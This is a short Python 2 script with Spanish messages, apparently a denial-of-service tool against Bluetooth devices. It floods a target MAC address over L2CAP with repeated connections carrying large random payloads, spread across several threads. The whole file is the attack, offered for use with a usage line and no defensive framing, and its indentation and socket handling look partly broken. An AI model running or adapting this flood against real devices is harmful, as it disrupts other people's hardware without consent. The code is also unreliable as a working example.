#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Autor: v4char
# Email: v4char@gmail.com

import bluetooth
import sys
import threading
import random
import string

caracteres = 1200

print "\n\nScript DOS bluetooth by v4char"
print "Se paciente puede tardar un poco\n"

if len(sys.argv) >= 3:

   def generar(longitud):
      return ''.join(random.choice(string.hexdigits) for i in range(longitud))

   def bucle():
      global caracteres
      try:
         while 1:
            s = bluetooth.BluetoothSocket (bluetooth.L2CAP)
            s.connect((sys.argv[1] ,3))
            buff = (generar(8).decode("hex"))*caracteres
            s.send(buff)
            s.close()
      except:
         s.close
               
   def main(hilos):
      threads = list()
      for i in range(hilos):
         t = threading.Thread(target=bucle)
         threads.append(t)
         t.start()

   def obtener_longitud():
		global caracteres
		try:
			s = bluetooth.BluetoothSocket (bluetooth.L2CAP)
			s.connect((sys.argv[1] ,3))
			s.connect((sys.argv[1] ,3))
			buff = (generar(8).decode("hex"))*caracteres
			s.send(buff)
			s.close
			print "Atacando..."
			main(int(sys.argv[2]))
		except:
			caracteres = caracteres - 1
	obtener_longitud()


else:
   print "Error usa \"python blue_crash.py bt_mac hilos\"\n";
